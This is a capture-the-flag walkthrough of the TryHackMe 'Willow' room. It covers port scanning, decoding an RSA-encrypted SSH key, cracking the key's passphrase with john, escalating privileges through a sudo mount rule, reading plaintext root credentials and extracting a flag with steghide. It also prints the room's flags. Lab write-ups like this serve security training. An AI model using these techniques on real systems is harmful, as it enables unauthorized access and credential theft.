# Willow

What lies under the Willow Tree?

[Willow](https://tryhackme.com/room/willow)

## Topic's

- Network Enumeration
- Web Poking
- Cryptography
  - RSA
  - Hex
- Brute Forcing (SSH)
- Misconfigured Binaries
- Stored Passwords & Keys
- Steganography

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Flags

Grab the flags from the Willow

```
kali@kali:~/CTFs/tryhackme/Willow$ sudo nmap -A -sS -sC -sV -O 10.10.126.38
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-15 14:56 CEST
Nmap scan report for 10.10.126.38
Host is up (0.036s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey:
|   1024 43:b0:87:cd:e5:54:09:b1:c1:1e:78:65:d9:78:5e:1e (DSA)
|   2048 c2:65:91:c8:38:c9:cc:c7:f9:09:20:61:e5:54:bd:cf (RSA)
|   256 bf:3e:4b:3d:78:b6:79:41:f4:7d:90:63:5e:fb:2a:40 (ECDSA)
|_  256 2c:c8:87:4a:d8:f6:4c:c3:03:8d:4c:09:22:83:66:64 (ED25519)
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Recovery Page
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      38687/tcp6  mountd
|   100005  1,2,3      40878/udp   mountd
|   100005  1,2,3      41487/udp6  mountd
|   100005  1,2,3      46685/tcp   mountd
|   100021  1,3,4      36422/udp6  nlockmgr
|   100021  1,3,4      54671/tcp   nlockmgr
|   100021  1,3,4      60175/tcp6  nlockmgr
|   100021  1,3,4      60926/udp   nlockmgr
|   100024  1          44403/tcp   status
|   100024  1          50315/tcp6  status
|   100024  1          50812/udp6  status
|   100024  1          58288/udp   status
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
2049/tcp open  nfs_acl 2-3 (RPC #100227)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/15%OT=22%CT=1%CU=30369%PV=Y%DS=2%DC=T%G=Y%TM=5F8846
OS:F9%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=2%ISR=10E%TI=Z%CI=I%II=I%TS=8)OP
OS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST
OS:11NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)EC
OS:N(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 23/tcp)
HOP RTT      ADDRESS
1   34.58 ms 10.8.0.1
2   34.65 ms 10.10.126.38

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.53 seconds
```

```
kali@kali:~/CTFs/tryhackme/Willow$ curl -s http://10.10.126.38/ | html2text > code.txt
kali@kali:~/CTFs/tryhackme/Willow$ cat code.txt | xxd -r -p
Hey Willow, here's your SSH Private key -- you know where the decryption key is!
2367 2367 2367 2367 2367 9709 8600 28638 18410 1735 33029 16186 28374 37248 33029 26842 16186 1 19276 2367 11339 33006 36500 4198 33781 33029 11405 5267 8600 1735 17632 16186 31131 26842 1137 22149 27582 3078 2367 17632 9709 17632 5267 27582 8600 27582 23721 11405 13256 33985 37248 183443 8600 18278 18278 27582 18330 13256 14422 14422 28061 10386 23219 10386 3339 25111 22053 213443 22149 33856 8452 11339 7568 22053 22149 3947 29609 9709 35243 5851 11405 18199 13256 33215499 12792 18199 20172 19276 8499 14422 22102 19396 12244 28061 23721 8452 27582 5851 19276 2837605 21404 27582 1735 35243 28638 12792 7496 27582 28061 33856 33856 28927 7568 11339 37438 3743199 19276 20172 22149 14422 5444 11339 7496 12792 28638 7568 18199 29655 35243 21889 18199 127999 12244 27582 21889 7496 37438 37248 21889 35734 33215 12244 8499 23219 18199 12792 31131 3567 26775 27582 14422 13256 18199 9709 29609 1735 8600 20172 28638 7568 28927 35734 8600 18410 3333256 33856 7914 8452 36500 17632 7358 3947 33215 28638 11339 18278 35734 28374 23721 11339 5444 28374 33856 12244 35670 22149 10386 36500 22102 12244 7568 5444 11405 26775 13256 11339 31131 5243 26842 7568 26775 19396 12244 19396 3947 27582 10386 7496 27582 35734 33215 5444 33856 2965 21889 22872 28927 33985 13256 33443 35734 8499 37248 8499 22102 18278 19396 33985 9450 26775 233985 9709 2950 7358 17632 28374 11339 18199 8499 7358 33215 12244 27582 18199 14605 22102 28376 5851 11339 35670 33215 18199 21889 33006 31131 27582 3339 7914 7496 13256 26775 31131 7496 2605 36500 28638 8452 35670 21889 22149 19276 33856 7568 4198 3078 37248 12244 33985 8452 18330 9 9709 18278 18410 18410 29655 5851 18199 26842 22053 28374 19396 33443 21889 22872 26842 7496 11735 7358 37248 22102 33985 23219 1735 23219 35670 33006 4198 16186 29609 22053 28061 37438 73517632 27582 35734 35670 23787 18278 35670 22872 5851 21404 8452 3339 20172 18278 7496 7358 36506 18330 3078 7568 18199 12792 7358 37438 36500 36500 37438 22149 18278 31131 19396 22149 18278 21404 29609 29655 4198 37438 28374 35734 14605 8600 17632 18278 7496 28638 9709 4198 12244 2511 14605 33215 1735 29609 26775 37438 4198 3947 18199 18330 31131 3078 17632 36500 33443 9709 3568 8600 23721 9450 21889 28638 18199 23219 1735 18199 21404 3339 11405 5851 8600 22149 11339 2839 4198 11339 22053 23219 18410 33985 27582 26842 22872 25111 17632 4198 18199 28374 19396 122448499 21404 21404 23787 33856 18199 9450 11405 35734 28374 20172 29609 28061 10386 18410 35243 2 18199 4198 18278 31131 33006 23219 8452 33985 3339 23219 33856 33443 5851 4198 14422 18278 1829 3947 3078 10386 3947 22149 4198 4198 21889 27582 18199 7568 3339 8499 14605 7568 20172 12244 721 8600 12244 18330 11405 1735 21404 5444 3339 21889 18410 14422 35734 18199 8600 20172 23219  33215 23219 3078 19276 20172 23219 11339 28374 35734 8499 7496 12244 1735 3339 33985 37438 394339 37248 26842 23787 33215 18410 22149 11339 14422 9709 8499 29609 22149 25111 35734 28374 33405 8452 28638 3078 21889 29655 35734 9450 28927 28927 23219 11405 35734 26842 33006 11339 33215 21404 11339 18199 7568 22149 14422 26842 17632 5851 35734 22872 37438 9709 8499 8600 37248 860950 20172 35670 35243 3078 28374 5851 26775 22872 4198 33985 37438 2950 21889 7496 8600 9709 2074 12792 14422 22053 7358 8600 33006 22872 7914 3947 37248 21404 11339 35243 18199 35734 23721 386 27582 28374 33443 3339 12244 31131 28927 25111 26775 33215 33215 37248 7914 9709 35243 357314422 1735 22053 13256 37248 33006 11405 19396 21889 7914 21404 37438 31131 29609 21889 23721 356 1735 31131 28061 28061 2950 35734 23219 7496 35734 3947 27582 22149 25111 7568 22149 21889 18 23721 3078 26775 13256 36500 28927 29609 8600 23787 5444 5851 21889 33856 8452 16186 29609 29 8600 8600 33856 23787 22872 37248 23721 5851 3339 22872 23219 3947 18278 5444 23219 29655 7358358 28927 11405 7568 33856 22102 20172 37248 11405 5851 7496 12792 35243 11339 23219 1735 22149 19276 8452 35670 36500 3339 3339 7568 22102 36500 12244 28638 5444 37438 29655 7358 9450 19276950 26775 12244 8499 2950 36500 33006 7914 5851 7358 8452 9450 28927 29655 5851 23219 33006 173 10386 35734 23787 33006 28374 9709 17632 7914 22102 19276 29609 18330 21404 33443 23787 18278 3947 7914 37248 8452 28374 22872 37248 7568 14605 29609 35734 18278 9709 29655 5851 19396 3524325111 29609 21404 20172 21404 28927 13256 28061 3339 8600 7914 3947 1735 19276 33215 8600 338569 11339 29655 18330 5444 33856 33443 22872 23721 25111 9450 7358 18330 33006 22102 28638 4198 11405 33443 19396 22053 23219 36500 9450 7496 37248 21889 35734 18278 33006 33856 4198 16186 114358 22872 28374 3078 33006 17632 35670 33443 18330 36500 18330 33856 26842 21404 28374 37438 2878 3947 36500 7568 35670 9709 31131 29609 31131 19396 23787 19276 8452 36500 5851 11405 14422 150 9450 12244 3947 23787 37438 3947 33985 7358 37248 8452 22872 35734 7358 28061 19396 9709 84535243 17632 29609 23721 37438 3947 35243 14605 37438 12244 19396 19276 14422 2367 2367 2367 236
```

```
kali@kali:~/CTFs/tryhackme/Willow$ cat rsa_keys
Public Key Pair: (23, 37627)
Private Key Pair: (61527, 37627)

We can assume the following values: * public key pair: (e, n) * private key pair: (d, n)

Meaning that we have: * e = 23 * n = 37627 * d = 61527
```

[https://www.cs.drexel.edu/~jpopyack/Courses/CSP/Fa17/notes/10.1_Cryptography/RSA_Express_EncryptDecrypt_v2.html](https://www.cs.drexel.edu/~jpopyack/Courses/CSP/Fa17/notes/10.1_Cryptography/RSA_Express_EncryptDecrypt_v2.html)

```
kali@kali:~/CTFs/tryhackme/Willow$ cat code.txt | xxd -r -p > code_d.txt
kali@kali:~/CTFs/tryhackme/Willow$ touch id_rsa
kali@kali:~/CTFs/tryhackme/Willow$ chmod 600 id_rsa
kali@kali:~/CTFs/tryhackme/Willow$ ssh -i id_rsa willow@10.10.126.38
The authenticity of host '10.10.126.38 (10.10.126.38)' can't be established.
ECDSA key fingerprint is SHA256:6caf+NZ1ecyCIYr6PD09286by/SsrR4UdA9DZR/SgD4.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.126.38' (ECDSA) to the list of known hosts.
Enter passphrase for key 'id_rsa':

kali@kali:~/CTFs/tryhackme/Willow$ /usr/share/john/ssh2john.py id_rsa > ssh.hash
kali@kali:~/CTFs/tryhackme/Willow$ john ssh.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
wildflower       (id_rsa)
1g 0:00:00:13 DONE (2020-10-15 15:11) 0.07535g/s 1080Kp/s 1080Kc/s 1080KC/sa6_123..*7¡Vamos!
Session completed
kali@kali:~/CTFs/tryhackme/Willow$ ssh -i id_rsa willow@10.10.126.38
Enter passphrase for key 'id_rsa':




        "O take me in your arms, love
        For keen doth the wind blow
        O take me in your arms, love
        For bitter is my deep woe."
                 -The Willow Tree, English Folksong




willow@willow-tree:~$
```

```
kali@kali:~/CTFs/tryhackme/Willow$ scp -i id_rsa willow@10.10.126.38:/home/willow/user.jpg .
Enter passphrase for key 'id_rsa':
user.jpg                                                     100%   12KB 158.4KB/s   00:00
```

![](./user.jpg)

`THM{beneath_th_weeping_willow_tree}`

```
willow@willow-tree:~$ sudo -l
Matching Defaults entries for willow on willow-tree:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User willow may run the following commands on willow-tree:
    (ALL : ALL) NOPASSWD: /bin/mount /dev/*
willow@willow-tree:~$ ls -l /dev/
total 0
brw-rw----  1 root disk    202,   5 Oct 15 13:54 hidden_backup
willow@willow-tree:~$ mkdir /home/willom/bcp/
mkdir: cannot create directory ‘/home/willom/bcp/’: No such file or directory
willow@willow-tree:~$ mkdir /home/willow/bcp/
willow@willow-tree:~$ sudo mount /dev/hidden_backup /home/willow/bcp/
willow@willow-tree:~$ ls -l /home/willow/bcp/
total 1
-rw-r--r-- 1 root root 42 Jan 30  2020 creds.txt
willow@willow-tree:~$ cat /home/willow/bcp/creds.txt
root:7QvbvBTvwPspUK
willow:U0ZZJLGYhNAT2s
willow@willow-tree:~$ su root
Password:
root@willow-tree:/home/willow# ls -l /root
total 4
-rw-r--r-- 1 root root 139 Jan 30  2020 root.txt
root@willow-tree:/home/willow# cat /root/root.txt
This would be too easy, don't you think? I actually gave you the root flag some time ago.
You've got my password now -- go find your flag!
```

```
kali@kali:~/CTFs/tryhackme/Willow$ steghide extract -sf user.jpg
Enter passphrase:
wrote extracted data to "root.txt".
kali@kali:~/CTFs/tryhackme/Willow$ cat root.txt
THM{find_a_red_rose_on_the_grave}
```

1. User Flag:

`THM{beneath_th_weeping_willow_tree}`

2. Root Flag:

`THM{find_a_red_rose_on_the_grave}`
